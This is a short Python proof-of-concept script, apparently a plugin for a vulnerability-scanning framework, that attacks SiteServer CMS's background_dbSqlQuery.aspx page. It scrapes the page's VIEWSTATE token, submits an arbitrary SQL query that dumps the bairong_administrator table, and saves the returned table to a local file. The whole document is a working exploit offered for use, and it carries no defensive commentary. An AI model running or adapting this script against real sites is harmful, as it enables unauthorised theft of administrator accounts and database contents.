import re

import requests

from lib.core.data import target


def poc():
    try:
        if not target.url.endswith(
                "siteserver/platform/background_dbSqlQuery.aspx"):
            print(
                "[*] Please make sure the url end with 'siteserver/platform/background_dbSqlQuery.aspx'"
            )
            exit()
        url = target.url

        header = {"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"}

        p1 = re.compile("(?<=id=\"__VIEWSTATE\" value=\")(.*)(?=\")")
        r = requests.get(url, headers=header, allow_redirects=False)
        viewstate = re.search(p1, r.text.encode(r.encoding)).group(0)
        print("[*] Get the VIEWSTATE value:" + viewstate)

        # query
        payload = "select * from bairong_administrator"
        postData = {
            "__EVENTTARGET": "",
            "__EVENTARGUMENT": "",
            "__VIEWSTATE": viewstate,
            "SqlQuery": payload,
            "submit": "%E6%9F%A5+%E8%AF%A2"
        }

        r = requests.post(
            url, headers=header, data=postData, allow_redirects=False)

        startTable = "<table class=\"table table-bordered table-hover\" cellspacing=\"0\" id=\"MyDataGrid\" style=\"border-collapse:collapse;\">"
        startTableIndex = r.text.find(startTable)
        endTable = "</table>"
        endTableIndex = r.text.find(endTable)

        saveResult = raw_input("[*] Save the result to (Default: temp.html) :")
        if not saveResult:
            saveResult = "temp.html"
        with open(saveResult, "w") as f:
            f.write(r.text[startTableIndex:endTableIndex].encode(r.encoding))
        print("[*] Open the browser to see the result :" + saveResult)
    except KeyError as e:
        print(
            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
        )
